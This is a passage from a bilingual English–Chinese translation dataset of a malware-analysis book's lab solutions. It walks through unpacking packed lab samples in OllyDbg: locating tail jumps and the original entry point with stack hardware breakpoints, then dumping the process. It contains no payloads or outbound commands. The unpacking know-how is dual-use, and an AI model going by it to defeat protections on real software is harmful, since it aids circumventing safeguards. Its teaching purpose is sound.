- en: 00409F49 DB 00
  id: totrans-6172
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F49 DB 00
- en: 00409F4A DB 00
  id: totrans-6173
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F4A DB 00
- en: 00409F4B DB 00
  id: totrans-6174
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F4B DB 00
- en: 00409F4C DB 00
  id: totrans-6175
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F4C DB 00
- en: 00409F4D DB 00
  id: totrans-6176
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F4D DB 00
- en: 00409F4E DB 00
  id: totrans-6177
  prefs: []
  type: TYPE_NORMAL
  zh: 00409F4E DB 00
- en: '*Listing 18-1L: Tail jump for the modified UPX packer* The tail jump at  is
    followed by a series of 0x00 bytes. It jumps to a location that is very far away.
    We set a breakpoint on the tail jump and resume execution of our program. Once
    the breakpoint is hit, we single-step on the jmp instruction to take us to the
    OEP.'
  id: totrans-6178
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 18-1L：修改后的 UPX 打包程序的尾部跳转* 尾部跳转后面跟着一系列 0x00 字节。它跳转到一个非常远的地址。我们在尾部跳转处设置了一个断点，并继续执行我们的程序。一旦断点被触发，我们就对
    jmp 指令进行单步执行，以到达 OEP。'
- en: Next, we dump the process to a disk using **Plugins****OllyDump****Dump**
    **Debugged Process**. Accept all of the default options, click **Dump**, and then
    select a filename for the dumped process.
  id: totrans-6179
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用**插件****OllyDump****转储** **调试过程**将进程转储到磁盘。接受所有默认选项，点击**转储**，然后选择转储进程的文件名。
- en: We’ve dumped the unpacked program to disk, and we’re finished. We can now view
    the program’s imports and strings, and easily analyze it with IDA Pro. A quick
    analysis reveals that this is the same code as Lab 14-1\.
  id: totrans-6180
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经将解包程序转储到磁盘上，并且完成了。现在我们可以查看程序导入和字符串，并且可以轻松地使用 IDA Pro 分析它。快速分析显示这是与实验 14-1
    相同的代码。
- en: '**Lab 18-2 Solutions**'
  id: totrans-6181
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 18-2 解答**'
- en: First, we run PEiD on the *Lab18-02.exe* file, and we learn that the packer
    is FSG 1.0 -> dulek/xt. To unpack this program manually, we first load it into
    OllyDbg. Several warnings state that the file may be packed. Since we already
    know that, we just click through the warnings.
  id: totrans-6182
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们在 *Lab18-02.exe* 文件上运行 PEiD，并了解到打包程序是 FSG 1.0 -> dulek/xt。为了手动解包此程序，我们首先将其加载到
    OllyDbg 中。几个警告指出文件可能已打包。由于我们已经知道了这一点，所以我们只是点击通过警告。
- en: When we load the program, it starts at entry point 0x00405000\. The easiest
    approach is to try the Find OEP by Section Hop option in the OllyDump plug-in.
    We select **Plugins****OllyDump****Find OEP by Section Hop (Trace** **Over)**,
    which stops the program at 0x00401090\. This is encouraging, because 0x00401090
    is close to the beginning of the executable. (The first set of executable instructions
    within a PE file is typically located at 0x00401000, and this is only 0x90 past
    that, which suggests that the Find OEP plug-in tool has worked.) At the instruction
    identified by the OllyDump plug-in, we see the code in Listing 18-2L.
  id: totrans-6183
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们加载程序时，它从入口点 0x00405000 开始。最简单的方法是尝试 OllyDump 插件中的“通过段跳转查找 OEP”选项。我们选择**插件****OllyDump****通过段跳转查找
    OEP (跟踪** **覆盖**)，这将在 0x00401090 处停止程序。这很鼓舞人心，因为 0x00401090 非常接近可执行文件的开始。（PE 文件内的第一组可执行指令通常位于
    0x00401000，这仅比那多 0x90，这表明查找 OEP 插件工具已经工作。）在 OllyDump 插件标识的指令处，我们看到列表 18-2L 中的代码。
- en: 00401090 DB 55 ; CHAR 'U'
  id: totrans-6184
  prefs: []
  type: TYPE_NORMAL
  zh: 00401090 DB 55 ; CHAR 'U'
- en: 00401091 DB 8B
  id: totrans-6185
  prefs: []
  type: TYPE_NORMAL
  zh: 00401091 DB 8B
- en: 00401092 DB EC
  id: totrans-6186
  prefs: []
  type: TYPE_NORMAL
  zh: 00401092 DB EC
- en: 00401093 DB 6A ; CHAR 'j'
  id: totrans-6187
  prefs: []
  type: TYPE_NORMAL
  zh: 00401093 DB 6A ; CHAR 'j'
- en: '**1 8**'
  id: totrans-6188
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 8**'
- en: 00401094 DB FF
  id: totrans-6189
  prefs: []
  type: TYPE_NORMAL
  zh: 00401094 DB FF
- en: 00401095 DB 68 ; CHAR 'h'
  id: totrans-6190
  prefs: []
  type: TYPE_NORMAL
  zh: 00401095 DB 68 ; CHAR 'h'
- en: '*Listing 18-2L: Code at the OEP that has not been analyzed by OllyDbg* Depending
    on your version, OllyDbg may not have disassembled this code because it did not
    realize that it is code. This is somewhat common and unpredictable when dealing
    with packed programs, and it can be a sign that the code is part of the original
    code, rather than part of the unpacking stub.'
  id: totrans-6191
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 18-2L：未经过 OllyDbg 分析的 OEP 代码* 根据您的版本，OllyDbg 可能没有反汇编此代码，因为它没有意识到它是代码。当处理打包程序时，这种情况是相当常见且不可预测的，并且可能是代码是原始代码的一部分而不是解包占位符的迹象。'
- en: Solutions to Labs
  id: totrans-6192
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**685**'
  id: totrans-6193
  prefs: []
  type: TYPE_NORMAL
  zh: '**685**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6194
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: To force OllyDbg to disassemble the code, right-click the first byte and select
    **Analysis****Analyze** **Code**. This displays the code for the beginning of
    the program, as shown in Listing 18-3L.
  id: totrans-6195
  prefs: []
  type: TYPE_NORMAL
  zh: 要强制 OllyDbg 反汇编代码，右键单击第一个字节并选择**分析****分析** **代码**。这会显示程序开头的代码，如列表 18-3L 所示。
- en: 00401090 PUSH EBP ; msvcrt.77C10000
  id: totrans-6196
  prefs: []
  type: TYPE_NORMAL
  zh: 00401090 PUSH EBP ; msvcrt.77C10000
- en: 00401091 MOV EBP,ESP
  id: totrans-6197
  prefs: []
  type: TYPE_NORMAL
  zh: 00401091 MOV EBP,ESP
- en: 00401093 PUSH -1
  id: totrans-6198
  prefs: []
  type: TYPE_NORMAL
  zh: 00401093 PUSH -1
- en: 00401095 PUSH Lab07-02.00402078
  id: totrans-6199
  prefs: []
  type: TYPE_NORMAL
  zh: 00401095 PUSH Lab07-02.00402078
- en: 0040109A PUSH Lab07-02.004011D0
  id: totrans-6200
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109A PUSH Lab07-02.004011D0
- en: '*Listing 18-3L: Code at the OEP after it has been analyzed by OllyDbg* The
    first two instructions in Listing 18-3L look like the start of a function, further
    convincing us that we have found the OEP. Scrolling down a little, we also see
    the string www.practicalmalwareanalysis.com, which is further evidence that this
    is part of the original program and not the unpacking stub.'
  id: totrans-6201
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 18-3L：经过 OllyDbg 分析后的 OEP 代码* 列表 18-3L 的前两条指令看起来像是函数的开始，这进一步使我们确信我们已经找到了
    OEP。向下滚动一点，我们还可以看到字符串 www.practicalmalwareanalysis.com，这进一步证明这是原始程序的一部分，而不是解包的占位符。'
- en: Next, we dump the process to a disk using **Plugins****OllyDump****Dump**
    **Debugged** **Process**. Leave all of the default options, click **Dump**, and
    select a filename for the dumped process.
  id: totrans-6202
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用 **插件****OllyDump****转储** **调试进程**将进程转储到磁盘。保留所有默认选项，点击 **转储**，并为转储的进程选择一个文件名。
- en: Now, we’re finished. We can view the program’s imports and strings, and easily
    analyze it with IDA Pro. A quick analysis reveals that this is the same code as
    *Lab07-02.exe*.
  id: totrans-6203
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经完成。我们可以查看程序导入和字符串，并使用 IDA Pro 轻松分析它。快速分析显示，这与 *Lab07-02.exe* 的代码相同。
- en: '**Lab 18-3 Solutions**'
  id: totrans-6204
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 18-3 解决方案**'
- en: First, we run PEiD on the *Lab18-03.exe* file, and it tells us that the packer
    is PECompact 1.68 - 1.84 -> Jeremy Collake. We load the program into OllyDbg and
    see several warnings that the file may be packed. We can ignore these warnings.
  id: totrans-6205
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们在 *Lab18-03.exe* 文件上运行 PEiD，它告诉我们打包器是 PECompact 1.68 - 1.84 -> Jeremy Collake。我们将程序加载到
    OllyDbg 中，并看到几个警告，表明文件可能被打包。我们可以忽略这些警告。
- en: The program starts at address 0x00405130\. We try the **Find OEP by** **Section
    Hop (Trace Into)** option in the OllyDump plug-in. We see the code shown in Listing
    18-4L as OllyDump’s guess at the OEP. However, there are several reasons this
    doesn’t look like the OEP. The most obvious is that it accesses values above the
    base pointer at . If this were the file’s entry point, any data above the base
    pointer would not have been initialized.
  id: totrans-6206
  prefs: []
  type: TYPE_NORMAL
  zh: 程序从地址 0x00405130 开始。我们在 OllyDump 插件中尝试了 **通过段跳转（Trace Into）查找 OEP** 选项。我们看到清单
    18-4L 中显示的代码，这是 OllyDump 对 OEP 的猜测。然而，有几个原因表明这看起来不像 OEP。最明显的是它访问了基指针之上的值。如果这是文件的入口点，基指针之上的任何数据都没有被初始化。
- en: 0040A110 ENTER 0,0
  id: totrans-6207
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A110 ENTER 0,0
- en: 0040A114 PUSH EBP
  id: totrans-6208
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A114 PUSH EBP
- en: 0040A115 MOV ESI,DWORD PTR SS:[EBP+8]
  id: totrans-6209
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A115 MOV ESI,DWORD PTR SS:[EBP+8]
- en: 0040A118 MOV EDI,DWORD PTR SS:[EBP+C]
  id: totrans-6210
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A118 MOV EDI,DWORD PTR SS:[EBP+C]
- en: 0040A11B CLD
  id: totrans-6211
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A11B CLD
- en: 0040A11C MOV DL,80
  id: totrans-6212
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A11C MOV DL,80
- en: 0040A11E MOV AL,BYTE PTR DS:[ESI]
  id: totrans-6213
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A11E MOV AL,BYTE PTR DS:[ESI]
- en: 0040A120 INC ESI
  id: totrans-6214
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A120 INC ESI
- en: 0040A121 MOV BYTE PTR DS:[EDI],AL
  id: totrans-6215
  prefs: []
  type: TYPE_NORMAL
  zh: 0040A121 MOV BYTE PTR DS:[EDI],AL
- en: '*Listing 18-4L: OllyDump’s guess at the OEP after using the Find OEP by Section
    Hop (Trace* *Into) option*'
  id: totrans-6216
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 18-4L：使用“通过段跳转（Trace Into）查找 OEP”选项后 OllyDump 对 OEP 的猜测*'
- en: '**686**'
  id: totrans-6217
  prefs: []
  type: TYPE_NORMAL
  zh: '**686**'
- en: Appendix C
  id: totrans-6218
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6219
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Next, we try the **Find OEP by Section Hop (Trace Over)** option and we see
    that the code stops on a ret instruction at the end of a function in ntdll, which
    is clearly not the OEP.
  id: totrans-6220
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们尝试 **通过段跳转（Trace Over）查找 OEP** 选项，我们看到代码在 ntdll 函数的末尾的 ret 指令处停止，这显然不是
    OEP。
- en: Since the OllyDump plug-in didn’t work, we examine the code to see if the tail
    jump is easy to spot. As shown in Listing 18-5L, we eventually come to some code
    that looks like a tail jump. This code is a retn instruction followed by a bunch
    of zero bytes. We know that the code can’t go past this point.
  id: totrans-6221
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 OllyDump 插件不起作用，我们检查代码以查看尾部跳转是否容易发现。如清单 18-5L 所示，我们最终到达一些看起来像尾部跳转的代码。这段代码是一个
    retn 指令，后面跟着一些零字节。我们知道代码不能超过这个点。
- en: 00405622 SCAS DWORD PTR ES:[EDI]
  id: totrans-6222
  prefs: []
  type: TYPE_NORMAL
  zh: 00405622 SCAS DWORD PTR ES:[EDI]
- en: 00405623 ADD BH,CH
  id: totrans-6223
  prefs: []
  type: TYPE_NORMAL
  zh: 00405623 ADD BH,CH
- en: 00405625 STC
  id: totrans-6224
  prefs: []
  type: TYPE_NORMAL
  zh: 00405625 STC
- en: 00405626 RETN 0EC3F
  id: totrans-6225
  prefs: []
  type: TYPE_NORMAL
  zh: 00405626 RETN 0EC3F
- en: 00405629 ADD BYTE PTR DS:[EAX],AL
  id: totrans-6226
  prefs: []
  type: TYPE_NORMAL
  zh: 00405629 ADD BYTE PTR DS:[EAX],AL
- en: 0040562B ADD BYTE PTR DS:[EAX],AL
  id: totrans-6227
  prefs: []
  type: TYPE_NORMAL
  zh: 0040562B ADD BYTE PTR DS:[EAX],AL
- en: 0040562D ADD BYTE PTR DS:[EAX],AL
  id: totrans-6228
  prefs: []
  type: TYPE_NORMAL
  zh: 0040562D ADD BYTE PTR DS:[EAX],AL
- en: '*Listing 18-5L: A possible tail jump*'
  id: totrans-6229
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 18-5L：一个可能的尾部跳转*'
- en: Now, we set a breakpoint on the retn instruction at  and start our program.
    First, we set a regular breakpoint (INT 3). OllyDbg displays a warning, because
    the breakpoint is outside the code section and may cause problems.
  id: totrans-6230
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们在 retn 指令上设置一个断点并启动我们的程序。首先，我们设置一个常规断点（INT 3）。OllyDbg 显示一个警告，因为断点位于代码段之外，可能会引起问题。
- en: When we run our program, we eventually get an exception that the program can’t
    handle, and we see that the code at our breakpoint has been changed.
  id: totrans-6231
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们运行程序时，我们最终会得到一个程序无法处理的异常，我们看到断点处的代码已经改变。
- en: Now we know that the code is self-modifying and that our breakpoint has not
    worked properly.
  id: totrans-6232
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道代码是自修改的，并且我们的断点没有正确工作。
- en: When dealing with self-modifying code, it’s often useful to use a hardware breakpoint
    instead of a software breakpoint because the self-modifying code will overwrite
    the INT 3 (0xcc) instruction used to implement software breakpoints. Starting
    over with a hardware breakpoint, we run the program and see that it starts to
    run without ever hitting our breakpoint. This tells us that we probably haven’t
    found the tail jump and we need to try another strategy.
  id: totrans-6233
  prefs: []
  type: TYPE_NORMAL
  zh: 在处理自修改代码时，通常使用硬件断点而不是软件断点很有用，因为自修改代码将覆盖实现软件断点使用的INT 3 (0xcc)指令。重新使用硬件断点开始运行程序，我们看到它开始运行而从未触碰到我们的断点。这告诉我们我们可能还没有找到尾部跳转，我们需要尝试另一种策略。
- en: Looking at the entry point of the packed program, we see the instructions shown
    in Listing 18-6L.
  id: totrans-6234
  prefs: []
  type: TYPE_NORMAL
  zh: 查看打包程序的入口点，我们看到图18-6L中显示的指令。
- en: 00405130 JMP SHORT Lab09-02.00405138
  id: totrans-6235
  prefs: []
  type: TYPE_NORMAL
  zh: 00405130 JMP SHORT Lab09-02.00405138
- en: 00405132 PUSH 1577
  id: totrans-6236
  prefs: []
  type: TYPE_NORMAL
  zh: 00405132 PUSH 1577
- en: 00405137 RETN
  id: totrans-6237
  prefs: []
  type: TYPE_NORMAL
  zh: 00405137 RETN
- en: 00405138 PUSHFD
  id: totrans-6238
  prefs: []
  type: TYPE_NORMAL
  zh: 00405138 PUSHFD
- en: 00405139 PUSHAD
  id: totrans-6239
  prefs: []
  type: TYPE_NORMAL
  zh: 00405139 PUSHAD
- en: '**1 8**'
  id: totrans-6240
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 8**'
- en: 0040513A CALL Lab09-02.00405141
  id: totrans-6241
  prefs: []
  type: TYPE_NORMAL
  zh: 0040513A CALL Lab09-02.00405141
- en: 0040513F XOR EAX,EAX
  id: totrans-6242
  prefs: []
  type: TYPE_NORMAL
  zh: 0040513F XOR EAX,EAX
- en: '*Listing 18-6L: Start of the unpacking stub*'
  id: totrans-6243
  prefs: []
  type: TYPE_NORMAL
  zh: '*图18-6L：在栈上设置硬件断点以帮助找到OEP*'
- en: The first instruction at  is an unconditional jump that skips the next two
    instructions. The first two instructions that affect memory are pushfd at 
  id: totrans-6244
  prefs: []
  type: TYPE_NORMAL
  zh: 在处的第一条指令是一个无条件跳转，跳过了下两条指令。影响内存的前两条指令是pushfd在。
- en: and pushad at . These instructions save all of the registers and flags. It’s
    likely that the packing program will restore all the registers and flags immediately
    before it jumps to the OEP, so we can try to find the OEP by setting an Solutions
    to Labs
  id: totrans-6245
  prefs: []
  type: TYPE_NORMAL
  zh: and pushad at . 这些指令保存了所有寄存器和标志。很可能打包程序会在跳转到OEP之前立即恢复所有寄存器和标志，因此我们可以尝试通过设置断点来找到OEP。
- en: '**687**'
  id: totrans-6246
  prefs: []
  type: TYPE_NORMAL
  zh: '**687**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6247
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 155](index-721_1.png)'
  id: totrans-6248
  prefs: []
  type: TYPE_IMG
  zh: '![Image 155](index-721_1.png)'
- en: access breakpoint on the stack. Presumably, there will be a popad or popfd instruction
    right before the tail jump, which will lead us to the OEP.
  id: totrans-6249
  prefs: []
  type: TYPE_NORMAL
  zh: 在栈上设置访问断点。据推测，在尾部跳转之前将有一个popad或popfd指令，这将引导我们到OEP。
- en: We restart the program and step-over the first three instructions. The program
    should be stopped at the call instruction at  in Listing 18-6L. Now we need to
    find the value of the stack pointer to set a breakpoint. To do so, we examine
    the registers window, as shown on the top right of Figure 18-1L.
  id: totrans-6250
  prefs: []
  type: TYPE_NORMAL
  zh: 我们重新启动程序并跳过前三个指令。程序应该在图18-6L中的处的调用指令处停止。现在我们需要找到栈指针的值来设置断点。为此，我们需要检查寄存器窗口，如图18-1L右上角所示。
- en: '*Figure 18-1L: Setting a hardware breakpoint on the stack to help find OEP*'
  id: totrans-6251
  prefs: []
  type: TYPE_NORMAL
  zh: '*图18-1L：在栈上设置硬件断点以帮助找到OEP*'
- en: The stack is at address 0x12FFA0, as shown at  in Figure 18-1L. To set a breakpoint,
    we first load that address in the memory dump by right-clicking  and selecting
    **Follow in Dump**. This will make the memory dump window at  appear as it does
    in Figure 18-1L.
  id: totrans-6252
  prefs: []
  type: TYPE_NORMAL
  zh: 栈的地址是0x12FFA0，如图18-1L中的所示。要设置断点，我们首先通过右键单击并选择**在转储中跟踪**来将该地址加载到内存转储中。这将使内存转储窗口看起来像图18-1L中的样子。
- en: To set a breakpoint on the last piece of data pushed onto the stack, we right-click
    the first data element on the stack at  in Figure 18-1L and select **Breakpoint****Memory
    on Access**. We then run our program. Unfortunately, it reaches an unhandled exception
    similar to when we set a breakpoint before.
  id: totrans-6253
  prefs: []
  type: TYPE_NORMAL
  zh: 要在最后压入栈的数据上设置断点，我们右键单击图18-1L中的栈上的第一个数据元素在处，并选择**断点****访问内存**。然后我们运行我们的程序。不幸的是，它达到了一个未处理的异常，类似于我们在之前设置断点时的情况。
- en: Next, we set the breakpoint with **Breakpoint****Hardware, on Access****Dword**.
  id: totrans-6254
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步，我们使用**断点****硬件，访问****Dword**来设置断点。
- en: When we start our program, our breakpoint is triggered. The program will break
    at the instructions shown in Listing 18-7L.
  id: totrans-6255
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们启动程序时，我们的断点被触发。程序将在图18-7L中显示的指令处中断。
- en: 0040754F POPFD
  id: totrans-6256
  prefs: []
  type: TYPE_NORMAL
  zh: 0040754F POPFD
- en: 00407550 PUSH EAX
  id: totrans-6257
  prefs: []
  type: TYPE_NORMAL
  zh: 00407550 PUSH EAX
- en: 00407551 PUSH Lab18-03.00401577
  id: totrans-6258
  prefs: []
  type: TYPE_NORMAL
  zh: 00407551 PUSH Lab18-03.00401577
- en: 00407556 RETN 4
  id: totrans-6259
  prefs: []
  type: TYPE_NORMAL
  zh: 00407556 RETN 4
- en: '*Listing 18-7L: Instructions where our stack breakpoint is triggered showing
    the tail jump* A few instructions into our code, we see a retn instruction that
    transfers execution to another location. This is probably the tail jump. We step
    to that instruction to determine where it goes and see the code in Listing 18-8L.
    This looks like the original code; the call to GetVersion at  is a dead giveaway.'
  id: totrans-6260
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-7L：触发我们的堆栈断点的指令，显示尾部跳转* 在我们的代码中，我们看到一个retn指令，它将执行权转移到另一个位置。这可能是尾部跳转。我们转到该指令以确定它去哪里，并查看列表18-8L中的代码。这看起来像是原始代码；处的GetVersion调用是一个明显的线索。'
- en: '**688**'
  id: totrans-6261
  prefs: []
  type: TYPE_NORMAL
  zh: '**688**'
- en: Appendix C
  id: totrans-6262
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6263
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**NOTE**'
  id: totrans-6264
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*As in* Lab18-02.exe *, you may need to force OllyDbg to disassemble this code
    using the* *Analysis* *Analyze Code command.*'
  id: totrans-6265
  prefs: []
  type: TYPE_NORMAL
  zh: '*与Lab18-02.exe类似*，您可能需要使用*分析* *分析代码命令*强制OllyDbg反汇编此代码。'
- en: 00401577 PUSH EBP
  id: totrans-6266
  prefs: []
  type: TYPE_NORMAL
  zh: 00401577 PUSH EBP
- en: 00401578 MOV EBP,ESP
  id: totrans-6267
  prefs: []
  type: TYPE_NORMAL
  zh: 00401578 MOV EBP,ESP
- en: 0040157A PUSH -1
  id: totrans-6268
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157A PUSH -1
- en: 0040157C PUSH Lab18-03.004040C0
  id: totrans-6269
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157C PUSH Lab18-03.004040C0
- en: 00401581 PUSH Lab18-03.0040203C ; SE handler installation 00401586 MOV EAX,DWORD
    PTR FS:[0]
  id: totrans-6270
  prefs: []
  type: TYPE_NORMAL
  zh: 00401581 PUSH Lab18-03.0040203C ; SE处理器安装 00401586 MOV EAX,DWORD PTR FS:[0]
- en: 0040158C PUSH EAX
  id: totrans-6271
  prefs: []
  type: TYPE_NORMAL
  zh: 0040158C PUSH EAX
- en: 0040158D MOV DWORD PTR FS:[0],ESP
  id: totrans-6272
  prefs: []
  type: TYPE_NORMAL
  zh: 0040158D MOV DWORD PTR FS:[0],ESP
- en: 00401594 SUB ESP,10
  id: totrans-6273
  prefs: []
  type: TYPE_NORMAL
  zh: 00401594 SUB ESP,10
- en: 00401597 PUSH EBX
  id: totrans-6274
  prefs: []
  type: TYPE_NORMAL
  zh: 00401597 PUSH EBX
- en: 00401598 PUSH ESI
  id: totrans-6275
  prefs: []
  type: TYPE_NORMAL
  zh: 00401598 PUSH ESI
- en: 00401599 PUSH EDI
  id: totrans-6276
  prefs: []
  type: TYPE_NORMAL
  zh: 00401599 PUSH EDI
- en: 0040159A MOV DWORD PTR SS:[EBP-18],ESP
  id: totrans-6277
  prefs: []
  type: TYPE_NORMAL
  zh: 0040159A MOV DWORD PTR SS:[EBP-18],ESP
- en: '0040159D CALL DWORD PTR DS:[404030] ; kernel32.GetVersion *Listing 18-8L:
    The OEP for Lab 18-3*'
  id: totrans-6278
  prefs: []
  type: TYPE_NORMAL
  zh: '0040159D CALL DWORD PTR DS:[404030] ; kernel32.GetVersion *列表18-8L: Lab 18-3的OEP*'
- en: Now, with EIP pointing to the first instruction at , we select **Plugins**
  id: totrans-6279
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，随着EIP指向处的第一条指令，我们选择**插件**
- en: '**OllyDump****Dump Debugged Process**. We click the **Get EIP as OEP** button,
    leaving all the other options with their default settings, and then click **Dump**.'
  id: totrans-6280
  prefs: []
  type: TYPE_NORMAL
  zh: '**OllyDump****转储调试进程**。我们点击**将EIP作为OEP**按钮，保留所有其他选项的默认设置，然后点击**转储**。'
- en: In the dialog, we enter a filename to save a copy of our unpacked program.
  id: totrans-6281
  prefs: []
  type: TYPE_NORMAL
  zh: 在对话框中，我们输入一个文件名以保存解包程序的副本。
- en: When we’re finished, we run the program and open it in IDA Pro to verify that
    it has been unpacked successfully. A brief analysis of the program reveals that
    the functionality is the same as *Lab09-02.exe*.
  id: totrans-6282
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们完成时，我们运行程序并在IDA Pro中打开它以验证它是否已成功解包。对程序的简要分析显示，其功能与*Lab09-02.exe*相同。
- en: This packer uses a variety of techniques to make it difficult to unpack and
    recognize the tail jump. Several of the usual strategies were ineffective because
    the packer takes explicit steps to thwart them. If using a particular technique
    seems difficult on a packed program, try different approaches until one works.
    In rare cases, none of the techniques will work easily.
  id: totrans-6283
  prefs: []
  type: TYPE_NORMAL
  zh: 这个打包程序使用各种技术使其难以解包和识别尾部跳转。由于打包程序采取了明确的步骤来阻止这些常用策略，其中一些策略无效。如果在使用打包程序时某个特定技术似乎很难，请尝试不同的方法，直到找到一个有效的方法。在罕见的情况下，可能没有任何技术能够轻松工作。
- en: '**Lab 18-4 Solutions**'
  id: totrans-6284
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 18-4 解决方案**'
- en: We open the *Lab18-04.exe* file in PEiD and learn that it is packed with ASPack
    2.12 -> Alexey Solodovnikov. We then open the malware in OllyDbg and see that
    the first instruction is pushad, which saves the registers onto the stack. We
    know from Chapter 18 that setting a breakpoint on the stack to search for the
    corresponding popad instruction may be a good strategy for this **1 8**
  id: totrans-6285
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在PEiD中打开*Lab18-04.exe*文件，并了解到它使用ASPack 2.12 -> Alexey Solodovnikov打包。然后我们在OllyDbg中打开恶意软件，看到第一条指令是pushad，它将寄存器保存到堆栈上。根据第18章的内容，我们知道在堆栈上设置断点以搜索相应的popad指令可能是一种有效的策略，特别是对于这个**1
    8**
- en: packer. We step-over the pushad instruction, as shown in Listing 18-9L at .
  id: totrans-6286
  prefs: []
  type: TYPE_NORMAL
  zh: 打包程序。我们跳过pushad指令，如图18-9L中的所示。
- en: 00411001 PUSHAD
  id: totrans-6287
  prefs: []
  type: TYPE_NORMAL
  zh: 00411001 PUSHAD
- en: 00411002 CALL Lab18-04.0041100A
  id: totrans-6288
  prefs: []
  type: TYPE_NORMAL
  zh: 00411002 CALL Lab18-04.0041100A
- en: 00411007 JMP 459E14F7
  id: totrans-6289
  prefs: []
  type: TYPE_NORMAL
  zh: 00411007 JMP 459E14F7
- en: '*Listing 18-9L: Start of the unpacking stub*'
  id: totrans-6290
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表18-9L：解包stub的开始*'
- en: We’re going to use the same technique that we used in the previous lab.
  id: totrans-6291
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用之前实验中使用的相同技术。
- en: Once we step-over the pushad instruction, our window looks like Figure 18-2L.
  id: totrans-6292
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们跳过pushad指令，我们的窗口看起来就像图18-2L。
- en: Solutions to Labs
  id: totrans-6293
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**689**'
  id: totrans-6294
  prefs: []
  type: TYPE_NORMAL
  zh: '**689**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6295
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 156](index-723_1.png)'
  id: totrans-6296
  prefs: []
  type: TYPE_IMG
  zh: '![Image 156](index-723_1.png)'
- en: '*Figure 18-2L: Setting a breakpoint on the stack for* Lab18-04.exe We right-click
    esp at  and select **Follow in Dump** in order to display the memory window,
    as shown in Figure 18-2L. We then click the top of the stack at  and select **Breakpoint****Hardware,
    on Access****DWORD** to set a breakpoint on the stack instruction.'
  id: totrans-6297
  prefs: []
  type: TYPE_NORMAL
  zh: '*图18-2L：为* Lab18-04.exe 设置堆栈断点* 我们在处右键单击esp，并选择**在转储中跟踪**以显示内存窗口，如图18-2L所示。然后我们点击堆栈顶部，并选择**断点****硬件，在访问****DWORD**来设置堆栈指令的断点。'
- en: We press F9 to start the program again. The program eventually hits our breakpoint,
    and we see the code shown in Listing 18-10L.
  id: totrans-6298
  prefs: []
  type: TYPE_NORMAL
  zh: 我们按F9键再次启动程序。程序最终触发了我们的断点，我们看到列表18-10L所示的代码。
- en: 004113AF POPAD
  id: totrans-6299
  prefs: []
  type: TYPE_NORMAL
  zh: 004113AF POPAD
- en: 004113B0 JNZ SHORT Lab18-04.004113BA
  id: totrans-6300
  prefs: []
  type: TYPE_NORMAL
  zh: 004113B0 JNZ SHORT Lab18-04.004113BA
- en: 004113B2 MOV EAX,1
  id: totrans-6301
  prefs: []
  type: TYPE_NORMAL
  zh: 004113B2 MOV EAX,1
- en: 004113B7 RETN 0C
  id: totrans-6302
  prefs: []
  type: TYPE_NORMAL
  zh: 004113B7 RETN 0C
